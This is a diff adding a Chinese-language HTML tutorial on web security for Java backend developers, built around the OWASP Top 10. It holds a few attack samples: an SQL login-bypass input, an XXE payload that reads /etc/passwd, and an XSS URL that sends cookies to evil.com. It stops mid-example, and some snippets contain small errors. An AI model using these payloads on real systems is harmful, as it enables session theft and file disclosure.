@@ -1,0 +1,1304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web安全教程 - 后端开发人员指南</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --background-color: #f5f5f5;
+            --text-color: #333;
+            --code-background: #f8f8f8;
+            --code-color: #e74c3c;
+            --note-background: #e8f4fd;
+            --note-border: #b3d7ff;
+            --warning-background: #fff3cd;
+            --warning-border: #ffeeba;
+            --tip-background: #d4edda;
+            --tip-border: #c3e6cb;
+            --vulnerability-background: #f8d7da;
+            --vulnerability-border: #f5c6cb;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--background-color);
+            padding-bottom: 50px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #eee;
+        }
+
+        h1 {
+            color: var(--primary-color);
+            margin-bottom: 0.5rem;
+        }
+
+        h2 {
+            color: var(--primary-color);
+            margin: 2rem 0 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 1px solid #eee;
+        }
+
+        h3 {
+            margin: 1.5rem 0 1rem;
+            color: var(--secondary-color);
+        }
+
+        h4 {
+            margin: 1.2rem 0 0.8rem;
+        }
+
+        p {
+            margin-bottom: 1rem;
+        }
+
+        ul, ol {
+            margin: 1rem 0 1rem 2rem;
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        code {
+            font-family: SFMono-Regular, Consolas, "Liberation Mono", Menlo, monospace;
+            background-color: var(--code-background);
+            color: var(--code-color);
+            padding: 0.2rem 0.4rem;
+            border-radius: 3px;
+            font-size: 0.9rem;
+        }
+
+        pre {
+            background-color: var(--code-background);
+            padding: 1rem;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+
+        pre code {
+            background-color: transparent;
+            padding: 0;
+            color: inherit;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0 1.5rem;
+        }
+
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+
+        th, td {
+            padding: 0.75rem;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 1.5rem auto;
+        }
+
+        .note, .warning, .tip, .vulnerability {
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+        }
+
+        .note {
+            background-color: var(--note-background);
+            border-left: 4px solid var(--note-border);
+        }
+
+        .warning {
+            background-color: var(--warning-background);
+            border-left: 4px solid var(--warning-border);
+        }
+
+        .tip {
+            background-color: var(--tip-background);
+            border-left: 4px solid var(--tip-border);
+        }
+        
+        .vulnerability {
+            background-color: var(--vulnerability-background);
+            border-left: 4px solid var(--vulnerability-border);
+        }
+
+        .toc {
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 1rem;
+            margin: 1rem 0 2rem;
+        }
+
+        .toc h3 {
+            margin-top: 0;
+        }
+
+        .toc ul {
+            list-style-type: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 0.5rem;
+        }
+
+        .toc a {
+            text-decoration: none;
+            color: var(--secondary-color);
+        }
+
+        .toc a:hover {
+            text-decoration: underline;
+        }
+
+        .steps {
+            counter-reset: step;
+            list-style-type: none;
+            margin-left: 0;
+        }
+
+        .steps li {
+            position: relative;
+            padding-left: 2.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .steps li::before {
+            counter-increment: step;
+            content: counter(step);
+            background-color: var(--primary-color);
+            color: white;
+            width: 1.8rem;
+            height: 1.8rem;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: absolute;
+            left: 0;
+            top: 0;
+        }
+
+        .image-caption {
+            text-align: center;
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: -1rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .best-practice {
+            border-left: 4px solid var(--secondary-color);
+            padding-left: 1rem;
+            margin: 1rem 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Web安全教程 - 后端开发人员指南</h1>
+            <p>掌握保护Web应用程序不受攻击的关键技术和最佳实践</p>
+        </header>
+
+        <div class="toc">
+            <h3>目录</h3>
+            <ul>
+                <li><a href="#introduction">1. 引言</a></li>
+                <li><a href="#owasp-top10">2. OWASP Top 10 安全风险</a>
+                    <ul>
+                        <li><a href="#injection">2.1 注入攻击</a></li>
+                        <li><a href="#broken-auth">2.2 失效的身份认证与会话管理</a></li>
+                        <li><a href="#sensitive-data">2.3 敏感数据泄露</a></li>
+                        <li><a href="#xxe">2.4 XML外部实体攻击</a></li>
+                        <li><a href="#broken-access">2.5 失效的访问控制</a></li>
+                        <li><a href="#security-misconfig">2.6 安全配置错误</a></li>
+                        <li><a href="#xss">2.7 跨站脚本攻击(XSS)</a></li>
+                        <li><a href="#insecure-deserialize">2.8 不安全的反序列化</a></li>
+                        <li><a href="#vulnerable-components">2.9 使用含有已知漏洞的组件</a></li>
+                        <li><a href="#insufficient-logging">2.10 不足的日志记录与监控</a></li>
+                    </ul>
+                </li>
+                <li><a href="#authentication">3. 身份认证与授权</a>
+                    <ul>
+                        <li><a href="#auth-best-practices">3.1 认证最佳实践</a></li>
+                        <li><a href="#password-storage">3.2 密码存储</a></li>
+                        <li><a href="#multi-factor">3.3 多因素认证</a></li>
+                        <li><a href="#jwt">3.4 JWT (JSON Web Token)</a></li>
+                        <li><a href="#oauth">3.5 OAuth和OpenID Connect</a></li>
+                    </ul>
+                </li>
+                <li><a href="#secure-coding">4. 安全编码实践</a>
+                    <ul>
+                        <li><a href="#input-validation">4.1 输入验证</a></li>
+                        <li><a href="#output-encoding">4.2 输出编码</a></li>
+                        <li><a href="#sql-injection">4.3 SQL注入防护</a></li>
+                        <li><a href="#xss-prevention">4.4 XSS防护策略</a></li>
+                        <li><a href="#csrf-protection">4.5 CSRF保护</a></li>
+                    </ul>
+                </li>
+                <li><a href="#data-protection">5. 数据保护</a>
+                    <ul>
+                        <li><a href="#encryption">5.1 加密与哈希</a></li>
+                        <li><a href="#sensitive-data-handling">5.2 敏感数据处理</a></li>
+                        <li><a href="#secure-communication">5.3 安全通信 (HTTPS/TLS)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#security-headers">6. HTTP安全头</a></li>
+                <li><a href="#api-security">7. API安全</a></li>
+                <li><a href="#security-testing">8. 安全测试</a>
+                    <ul>
+                        <li><a href="#static-analysis">8.1 静态分析</a></li>
+                        <li><a href="#dynamic-testing">8.2 动态测试</a></li>
+                        <li><a href="#penetration-testing">8.3 渗透测试</a></li>
+                    </ul>
+                </li>
+                <li><a href="#secure-deployment">9. 安全部署</a></li>
+                <li><a href="#incident-response">10. 安全事件响应</a></li>
+                <li><a href="#conclusion">11. 总结</a></li>
+            </ul>
+        </div>
+
+        <section id="introduction">
+            <h2>1. 引言</h2>
+            <p>在当今互联网时代，Web应用程序的安全性已成为开发过程中不可或缺的一部分。随着网络攻击手段的不断进化和攻击频率的增加，后端开发人员需要具备扎实的安全知识和技能，以构建和维护安全的Web应用程序。</p>
+            
+            <p>本教程旨在为后端开发人员提供全面的Web安全知识，涵盖从常见漏洞到防护措施的各个方面，帮助开发者构建更安全的应用程序。</p>
+
+            <h3>为什么Web安全对后端开发至关重要？</h3>
+            <ul>
+                <li><strong>数据保护</strong>：后端系统通常存储和处理敏感数据，如用户个人信息、支付详情等。</li>
+                <li><strong>用户信任</strong>：安全漏洞可能导致用户数据泄露，从而损害用户对应用的信任。</li>
+                <li><strong>商业声誉</strong>：安全事件会对企业声誉造成严重损害，导致客户流失。</li>
+                <li><strong>法律合规</strong>：许多行业和地区有严格的数据保护法规，如GDPR、CCPA等。</li>
+                <li><strong>财务影响</strong>：安全漏洞修复、赔偿和罚款可能带来巨大的财务负担。</li>
+            </ul>
+            
+            <div class="note">
+                <p><strong>注意：</strong>Web安全是一个持续发展的领域，攻击者不断发明新的攻击方式。保持知识更新，关注安全公告和最佳实践的变化非常重要。</p>
+            </div>
+            
+            <h3>本教程的目标受众</h3>
+            <p>本教程主要面向：</p>
+            <ul>
+                <li>Java后端开发人员</li>
+                <li>Web应用程序架构师</li>
+                <li>DevOps工程师</li>
+                <li>对Web安全感兴趣的IT专业人士</li>
+            </ul>
+            
+            <h3>教程内容概览</h3>
+            <p>本教程将围绕OWASP（开放Web应用安全项目）Top 10安全风险为核心，结合实际Java开发场景，介绍各类安全漏洞的原理、危害以及防护措施。我们将提供大量代码示例、最佳实践和实用工具，帮助开发者将安全知识应用到实际工作中。</p>
+        </section>
+
+        <section id="owasp-top10">
+            <h2>2. OWASP Top 10 安全风险</h2>
+            <p>OWASP Top 10是由开放Web应用安全项目（OWASP）定期发布的文档，列出了Web应用程序中最严重的十大安全风险。它已成为许多安全标准、工具和组织的参考基准。了解这些风险及其防护措施，是构建安全Web应用的基础。</p>
+            
+            <div class="note">
+                <p><strong>注意：</strong>本教程基于OWASP Top 10 (2021)版本。随着安全领域的发展，OWASP会定期更新这个列表。</p>
+            </div>
+
+            <section id="injection">
+                <h3>2.1 注入攻击</h3>
+                <p>注入攻击是指攻击者将恶意代码注入应用程序，并在执行时改变预期行为。最常见的注入类型包括SQL注入、NoSQL注入、OS命令注入和LDAP注入。</p>
+                
+                <div class="vulnerability">
+                    <h4>漏洞示例：SQL注入</h4>
+                    <p>考虑以下未经处理的JDBC查询：</p>
+                    <pre><code>// 不安全的代码示例
+String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);</code></pre>
+                    
+                    <p>攻击者可以输入：<code>admin' --</code>作为用户名，这会导致密码检查被注释掉，从而绕过身份验证。</p>
+                </div>
+                
+                <h4>防护措施</h4>
+                <ol class="steps">
+                    <li>
+                        <strong>使用参数化查询（预编译语句）</strong>
+                        <pre><code>// 安全的代码示例
+String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement statement = connection.prepareStatement(query);
+statement.setString(1, username);
+statement.setString(2, password);
+ResultSet resultSet = statement.executeQuery();</code></pre>
+                    </li>
+                    <li>
+                        <strong>使用ORM框架</strong>
+                        <p>如Hibernate、MyBatis等框架能帮助防止SQL注入：</p>
+                        <pre><code>// 使用JPA/Hibernate
+User user = entityManager
+    .createQuery("SELECT u FROM User u WHERE u.username = :username AND u.password = :password", User.class)
+    .setParameter("username", username)
+    .setParameter("password", password)
+    .getSingleResult();</code></pre>
+                    </li>
+                    <li>
+                        <strong>输入验证</strong>
+                        <p>验证所有输入数据的类型、长度、格式和范围。</p>
+                    </li>
+                    <li>
+                        <strong>最小权限原则</strong>
+                        <p>数据库用户应只具有执行必要操作的最小权限。</p>
+                    </li>
+                </ol>
+                
+                <div class="tip">
+                    <p><strong>提示：</strong>Spring Data JPA、MyBatis等框架默认提供了针对SQL注入的保护措施。在使用这些框架时，尽量使用其内置的查询方法和参数绑定功能。</p>
+                </div>
+            </section>
+
+            <section id="broken-auth">
+                <h3>2.2 失效的身份认证与会话管理</h3>
+                <p>身份认证和会话管理的问题可能允许攻击者获取他人的身份或会话信息，从而冒充合法用户。</p>
+                
+                <div class="vulnerability">
+                    <h4>常见漏洞</h4>
+                    <ul>
+                        <li>允许暴力破解密码</li>
+                        <li>允许弱密码</li>
+                        <li>未加密存储密码或使用弱加密</li>
+                        <li>会话ID在URL中暴露</li>
+                        <li>会话固定攻击</li>
+                        <li>会话超时设置不当</li>
+                    </ul>
+                </div>
+                
+                <h4>防护措施</h4>
+                <ol class="steps">
+                    <li>
+                        <strong>实施强密码策略</strong>
+                        <pre><code>// 使用正则表达式验证密码强度
+public boolean isStrongPassword(String password) {
+    String regex = "^(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%^&+=])(?=\\S+$).{8,}$";
+    return password.matches(regex);
+}</code></pre>
+                    </li>
+                    <li>
+                        <strong>安全存储密码</strong>
+                        <pre><code>// 使用Spring Security的BCrypt密码编码器
+@Bean
+public PasswordEncoder passwordEncoder() {
+    return new BCryptPasswordEncoder(12); // 强度因子为12
+}</code></pre>
+                    </li>
+                    <li>
+                        <strong>实施账户锁定机制</strong>
+                        <p>在多次登录失败后临时锁定账户。</p>
+                    </li>
+                    <li>
+                        <strong>安全的会话管理</strong>
+                        <ul>
+                            <li>使用随机生成的会话ID</li>
+                            <li>登录成功后重新生成会话ID</li>
+                            <li>设置合适的会话超时</li>
+                            <li>使用HTTPS保护会话Cookie</li>
+                        </ul>
+                        <pre><code>// Spring Security会话管理配置
+@Configuration
+@EnableWebSecurity
+public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
+    
+    @Override
+    protected void configure(HttpSecurity http) throws Exception {
+        http
+            .sessionManagement()
+                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
+                .invalidSessionUrl("/login?invalid")
+                .maximumSessions(1)
+                .maxSessionsPreventsLogin(true)
+                .expiredUrl("/login?expired");
+    }
+}</code></pre>
+                    </li>
+                </ol>
+                
+                <div class="best-practice">
+                    <h4>最佳实践：多因素认证</h4>
+                    <p>考虑为敏感操作或管理员账户实施多因素认证(MFA)，如使用Google Authenticator、手机短信或电子邮件验证码。Spring Security提供了MFA的扩展支持。</p>
+                </div>
+            </section>
+
+            <section id="sensitive-data">
+                <h3>2.3 敏感数据泄露</h3>
+                <p>敏感数据泄露指的是应用程序未能充分保护敏感信息（如密码、信用卡号、健康记录等），导致数据被未授权访问或被窃取。</p>
+                
+                <div class="vulnerability">
+                    <h4>常见漏洞</h4>
+                    <ul>
+                        <li>数据传输过程中未加密（如使用HTTP而非HTTPS）</li>
+                        <li>敏感数据明文存储</li>
+                        <li>使用弱加密算法或密钥</li>
+                        <li>在日志、错误消息或调试信息中包含敏感数据</li>
+                        <li>缓存中保留敏感数据</li>
+                    </ul>
+                </div>
+                
+                <h4>防护措施</h4>
+                <ol class="steps">
+                    <li>
+                        <strong>传输层安全</strong>
+                        <p>使用TLS/HTTPS保护所有敏感数据传输。在Spring Boot中：</p>
+                        <pre><code># application.properties
+server.ssl.key-store=classpath:keystore.p12
+server.ssl.key-store-password=your-password
+server.ssl.key-store-type=PKCS12
+server.ssl.key-alias=tomcat
+server.port=8443</code></pre>
+                    </li>
+                    <li>
+                        <strong>加密敏感数据</strong>
+                        <p>使用强加密算法保护存储的敏感数据：</p>
+                        <pre><code>// AES加密示例
+public String encrypt(String plainText, SecretKey key) throws Exception {
+    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+    byte[] iv = new byte[12]; // 随机生成更安全
+    new SecureRandom().nextBytes(iv);
+    GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
+    cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);
+    
+    byte[] cipherText = cipher.doFinal(plainText.getBytes(StandardCharsets.UTF_8));
+    
+    // 组合IV和密文以便解密
+    ByteBuffer byteBuffer = ByteBuffer.allocate(iv.length + cipherText.length);
+    byteBuffer.put(iv);
+    byteBuffer.put(cipherText);
+    
+    return Base64.getEncoder().encodeToString(byteBuffer.array());
+}</code></pre>
+                    </li>
+                    <li>
+                        <strong>遮蔽日志中的敏感数据</strong>
+                        <p>避免在日志中记录敏感信息，或使用遮蔽技术：</p>
+                        <pre><code>// 日志遮蔽示例
+private String maskCreditCard(String creditCardNumber) {
+    if (creditCardNumber == null || creditCardNumber.length() < 13) {
+        return "[INVALID CARD]";
+    }
+    
+    return "XXXX-XXXX-XXXX-" + creditCardNumber.substring(creditCardNumber.length() - 4);
+}
+
+// 使用示例
+logger.info("Processing payment with card: {}", maskCreditCard(creditCardNumber));</code></pre>
+                    </li>
+                    <li>
+                        <strong>使用安全的密钥管理</strong>
+                        <p>不要硬编码密钥，考虑使用密钥管理服务或安全的环境变量。</p>
+                    </li>
+                </ol>
+                
+                <div class="best-practice">
+                    <h4>最佳实践：敏感数据分类</h4>
+                    <p>对应用程序处理的数据进行分类（如公开、内部、敏感、高度敏感），并针对不同级别的数据应用相应的保护措施。对于高度敏感的数据，考虑使用字段级加密或令牌化技术。</p>
+                </div>
+            </section>
+
+            <section id="xxe">
+                <h3>2.4 XML外部实体(XXE)攻击</h3>
+                
+                <p>XML外部实体（XXE）攻击是一种针对解析XML输入的应用程序的攻击。当XML解析器配置不当，处理包含外部实体引用的XML输入时，攻击者可以利用这些引用来访问系统文件、执行服务器端请求伪造（SSRF）或导致拒绝服务攻击。</p>
+                
+                <div class="code-example">
+                    <h4>XXE攻击示例</h4>
+                    <pre><code class="language-xml">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [
+   &lt;!ELEMENT foo ANY &gt;
+   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
+&lt;foo&gt;&entity xxe; &lt;/foo&gt;</code></pre>
+                </div>
+                
+                <h4>主要风险</h4>
+                <ul>
+                    <li>服务器文件泄露</li>
+                    <li>服务器端请求伪造（SSRF）</li>
+                    <li>内网端口扫描</li>
+                    <li>拒绝服务攻击</li>
+                </ul>
+                
+                <h4>防护措施</h4>
+                <ol>
+                    <li><strong>禁用XML外部实体和DTD处理</strong>
+                        <div class="code-example">
+                            <pre><code class="language-java">// 使用JAXP（Java API for XML Processing）
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);</code></pre>
+                        </div>
+                    </li>
+                    <li><strong>使用更安全的数据格式</strong> - 可能的情况下，使用JSON等更简单的数据格式。</li>
+                    <li><strong>输入验证</strong> - 在服务器端验证和清理所有XML输入。</li>
+                    <li><strong>更新XML处理器</strong> - 确保使用最新版本的XML处理器和库。</li>
+                </ol>
+                
+                <div class="warning-box">
+                    <p><strong>注意：</strong>在某些情况下，完全禁用DTD可能会影响应用程序的功能。在这种情况下，考虑使用XML沙箱或专用的XML解析库，如DEFUSE XML库等。</p>
+                </div>
+            </section>
+
+            <section id="broken-access-control">
+                <h3>2.5 失效的访问控制</h3>
+                
+                <p>失效的访问控制是指系统未能正确限制用户对功能或数据的访问。当用户可以执行超出其预定权限的操作时，就会出现这类漏洞。这是OWASP Top 10中最常见的安全漏洞之一。</p>
+
+                <h4>常见的访问控制漏洞</h4>
+                <ul>
+                  <li><strong>水平权限越界</strong>：一个用户可以访问其他相同权限级别用户的资源（如用户A访问用户B的个人资料）</li>
+                  <li><strong>垂直权限越界</strong>：普通用户可以访问管理员级别的功能</li>
+                  <li><strong>未校验的参数</strong>：通过修改URL参数或请求数据来访问未授权资源</li>
+                  <li><strong>强制浏览</strong>：通过直接访问URL绕过正常导航流程</li>
+                  <li><strong>元数据操作</strong>：修改JWT令牌、cookie或隐藏字段以提升权限</li>
+                  <li><strong>CORS配置错误</strong>：允许未授权的跨域资源访问</li>
+                </ul>
+                
+                <div class="code-example">
+                  <h4>访问控制漏洞示例</h4>
+                  <pre><code class="language-java">// 错误示例：未检查用户是否有权限访问所请求的资源
+@GetMapping("/accounts/{accountId}")
+public Account getAccount(@PathVariable Long accountId) {
+    return accountRepository.findById(accountId).orElseThrow();
+}
+
+// 正确示例：添加权限验证
+@GetMapping("/accounts/{accountId}")
+public Account getAccount(@PathVariable Long accountId) {
+    // 获取当前用户
+    User user = getCurrentUser();
+    
+    // 检查用户是否有权限访问该账户
+    if (!user.getId().equals(accountId) && !user.isAdmin()) {
+        throw new AccessDeniedException("您无权访问此账户");
+    }
+    
+    return accountRepository.findById(accountId).orElseThrow();
+}</code></pre>
+                </div>
+                
+                <h4>防护措施</h4>
+                <ol>
+                  <li><strong>实施最小权限原则</strong> - 默认拒绝所有访问，然后选择性授予特定权限。</li>
+                  <li><strong>集中化访问控制机制</strong> - 使用框架提供的或自定义的集中式访问控制组件。</li>
+                  <li><strong>服务端验证</strong> - 所有访问控制检查必须在服务端实现，不能仅依赖前端验证。</li>
+                  <li><strong>记录访问控制失败</strong> - 监控并记录身份验证和授权失败的尝试。</li>
+                  <li><strong>API访问限制</strong> - 实施速率限制防止暴力破解攻击。</li>
+                </ol>
+
+                <div class="tip-box">
+                  <p><strong>提示：</strong>在Spring Security等框架中，可以使用注解如<code>@PreAuthorize("hasRole('ADMIN')")</code>或<code>@Secured("ROLE_ADMIN")</code>来实现方法级别的访问控制。</p>
+                </div>
+                
+                <h4>Spring Security实现示例</h4>
+                <div class="code-example">
+                  <pre><code class="language-java">@Configuration
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+
+    @Override
+    protected void configure(HttpSecurity http) throws Exception {
+        http
+            .authorizeRequests()
+                .antMatchers("/public/**").permitAll()
+                .antMatchers("/admin/**").hasRole("ADMIN")
+                .antMatchers("/user/**").hasAnyRole("USER", "ADMIN")
+                .antMatchers("/api/users/{id}/**").access("@userSecurity.checkUserId(authentication, #id)")
+                .anyRequest().authenticated()
+            .and()
+            .formLogin()
+                .loginPage("/login")
+                .permitAll();
+    }
+}
+
+// 自定义访问决策器
+@Component
+public class UserSecurity {
+    public boolean checkUserId(Authentication authentication, Long id) {
+        UserDetails userDetails = (UserDetails) authentication.getPrincipal();
+        User user = ((CustomUserDetails) userDetails).getUser();
+        
+        // 允许用户访问自己的资源或管理员访问任何资源
+        return user.getId().equals(id) || hasAdminRole(authentication);
+    }
+    
+    private boolean hasAdminRole(Authentication authentication) {
+        return authentication.getAuthorities().stream()
+                .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"));
+    }
+}</code></pre>
+                </div>
+              </section>
+
+              <!-- 2.6 安全配置错误 -->
+              <section id="security-misconfiguration">
+                <h3>2.6 安全配置错误</h3>
+                
+                <p>安全配置错误是指应用程序、框架、应用服务器、Web服务器、数据库服务器或平台的配置不正确或未充分加固，导致系统存在安全漏洞。这类问题在各种环境中普遍存在，通常是由于使用默认配置、不完整的配置或临时配置未及时更改造成的。</p>
+
+                <h4>常见的安全配置错误</h4>
+                <ul>
+                  <li><strong>使用默认账户和密码</strong> - 未更改系统默认的管理员账户密码</li>
+                  <li><strong>开启不必要的功能或服务</strong> - 服务器上运行未使用的功能、端口或服务</li>
+                  <li><strong>未更新软件</strong> - 使用含有已知漏洞的过时组件</li>
+                  <li><strong>错误处理不当</strong> - 向用户展示详细的错误信息，包括堆栈跟踪或敏感数据</li>
+                  <li><strong>缺少安全响应头</strong> - 未设置适当的安全相关HTTP头部</li>
+                  <li><strong>服务器目录遍历</strong> - 未禁止目录列表功能</li>
+                  <li><strong>权限配置宽松</strong> - 文件和目录权限过于宽松</li>
+                </ul>
+                
+                <div class="warning-box">
+                  <p><strong>警告：</strong>安全配置错误往往是攻击者获取系统访问权的首要途径，因为这类漏洞通常暴露在公网上且易于发现。</p>
+                </div>
+                
+                <h4>配置错误示例</h4>
+                <div class="code-example">
+                  <pre><code class="language-properties"># 错误的Spring Boot应用配置示例
+# 1. 在生产环境中启用H2控制台
+spring.h2.console.enabled=true
+spring.h2.console.path=/h2-console
+
+# 2. 在生产环境中启用调试模式
+debug=true
+spring.devtools.add-properties=true
+
+# 3. 关闭CSRF保护
+spring.security.csrf.disabled=true
+
+# 4. 配置不安全的会话Cookie
+server.servlet.session.cookie.secure=false
+server.servlet.session.cookie.http-only=false</code></pre>
+                </div>
+                
+                <h4>防护措施</h4>
+                <ol>
+                  <li><strong>安全的部署流程</strong> - 实施自动化、可重复的加固部署流程，包括开发、QA和生产环境。</li>
+                  <li><strong>环境隔离</strong> - 确保各环境配置相互隔离，并对每个环境应用适当的安全控制。</li>
+                  <li><strong>最小化组件</strong> - 仅安装和启用必需的功能、组件和服务。</li>
+                  <li><strong>安全检查</strong> - 定期审查和更新配置，删除未使用的依赖和功能。</li>
+                  <li><strong>安全通信</strong> - 加密传输中的数据，尤其是敏感信息。</li>
+                </ol>
+                
+                <h4>Spring Boot安全配置实践</h4>
+                <div class="code-example">
+                  <pre><code class="language-properties"># 生产环境安全配置示例
+
+# 禁用开发工具和调试功能
+debug=false
+spring.devtools.add-properties=false
+
+# 禁用H2控制台
+spring.h2.console.enabled=false
+
+# 启用HTTPS和HTTP/2
+server.ssl.enabled=true
+server.ssl.key-store=classpath:keystore.p12
+server.ssl.key-store-password=${SSL_KEY_STORE_PASSWORD}
+server.ssl.key-store-type=PKCS12
+server.http2.enabled=true
+
+# 配置安全Cookie
+server.servlet.session.cookie.secure=true
+server.servlet.session.cookie.http-only=true
+server.servlet.session.cookie.same-site=strict
+
+# 配置安全响应头
+server.compression.enabled=true
+server.compression.mime-types=text/html,text/xml,text/plain,text/css,application/javascript,application/json
+server.compression.min-response-size=1024
+
+# 错误处理 - 不泄露敏感信息
+server.error.include-stacktrace=never
+server.error.include-exception=false
+server.error.include-message=never
+
+# 配置日志级别，避免敏感信息泄露
+logging.level.root=WARN
+logging.level.org.springframework.web=INFO
+logging.level.com.myapp=INFO</code></pre>
+                </div>
+                
+                <div class="tip-box">
+                  <p><strong>最佳实践：</strong>使用环境变量或加密的外部配置存储敏感信息，如密码、密钥和凭证，避免将其硬编码在配置文件中。</p>
+                </div>
+                
+                <h4>安全响应头配置</h4>
+                <p>在Spring Security中配置安全相关HTTP头部：</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@Configuration
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+
+    @Override
+    protected void configure(HttpSecurity http) throws Exception {
+        http
+            // 其他安全配置...
+            .headers()
+                .contentSecurityPolicy("default-src 'self'; script-src 'self' https://trusted-cdn.com; img-src 'self' data:; style-src 'self' https://trusted-cdn.com; frame-ancestors 'none';")
+                .and()
+                .referrerPolicy(ReferrerPolicyHeaderWriter.ReferrerPolicy.SAME_ORIGIN)
+                .and()
+                .permissionsPolicy("camera=(), microphone=(), geolocation=(), payment=()")
+                .and()
+                .frameOptions().deny()
+                .and()
+                .xssProtection()
+                .and()
+                .cacheControl();
+    }
+}</code></pre>
+                </div>
+              </section>
+
+              <!-- 2.7 跨站脚本 (XSS) -->
+              <section id="xss">
+                <h3>2.7 跨站脚本 (XSS)</h3>
+                
+                <p>跨站脚本（Cross-Site Scripting，简称XSS）是一种常见的Web安全漏洞，允许攻击者将恶意脚本注入到受信任的网站上。当用户访问受影响的页面时，恶意脚本会在用户的浏览器上执行，允许攻击者窃取用户数据、会话令牌或重定向用户到恶意站点。</p>
+
+                <h4>XSS的类型</h4>
+                <div class="table-container">
+                  <table>
+                    <thead>
+                      <tr>
+                        <th>类型</th>
+                        <th>描述</th>
+                        <th>持久性</th>
+                        <th>危害程度</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td>存储型 (Stored XSS)</td>
+                        <td>恶意脚本存储在目标服务器上，当用户请求包含此脚本的页面时被执行</td>
+                        <td>持久</td>
+                        <td>高</td>
+                      </tr>
+                      <tr>
+                        <td>反射型 (Reflected XSS)</td>
+                        <td>恶意脚本包含在请求中，服务器将其"反射"回响应页面</td>
+                        <td>非持久</td>
+                        <td>中</td>
+                      </tr>
+                      <tr>
+                        <td>DOM型 (DOM-based XSS)</td>
+                        <td>漏洞存在于客户端代码中，修改DOM环境后触发恶意JavaScript执行</td>
+                        <td>通常非持久</td>
+                        <td>中至高</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <h4>漏洞示例</h4>
+                <p>以下是一个简单的反射型XSS漏洞示例:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@GetMapping("/search")
+public String search(@RequestParam String query, Model model) {
+    // 错误：未对用户输入进行转义
+    model.addAttribute("searchQuery", query);
+    // ...执行搜索逻辑
+    return "searchResults"; 
+}</code></pre>
+                </div>
+
+                <p>对应的模板文件 (例如使用Thymeleaf):</p>
+                <div class="code-example">
+                  <pre><code class="language-html">&lt;!-- 错误：直接输出未转义的用户输入 --&gt;
+&lt;div&gt;
+    您搜索的是: &lt;span th:utext="${searchQuery}"&gt;&lt;/span&gt;
+&lt;/div&gt;</code></pre>
+                </div>
+
+                <p>攻击者可以发送包含恶意JavaScript的查询，例如:</p>
+                <div class="code-example">
+                  <pre><code>http://example.com/search?query=&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></pre>
+                </div>
+
+                <h4>XSS防护措施</h4>
+                <ol>
+                  <li><strong>输入验证和净化</strong> - 验证所有用户输入并根据预期格式进行净化。</li>
+                  <li><strong>输出编码</strong> - 在HTML上下文中显示用户数据前，确保适当编码。</li>
+                  <li><strong>使用安全的模板系统</strong> - 默认情况下，大多数现代模板引擎会自动转义输出。</li>
+                  <li><strong>内容安全策略 (CSP)</strong> - 实施CSP头部限制可执行的脚本来源。</li>
+                  <li><strong>使用HttpOnly标志</strong> - 防止JavaScript访问敏感Cookie。</li>
+                  <li><strong>采用XSS过滤库</strong> - 使用经过验证的库过滤用户输入。</li>
+                </ol>
+
+                <h4>修复示例</h4>
+                <p>修复上述漏洞的Java代码:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@GetMapping("/search")
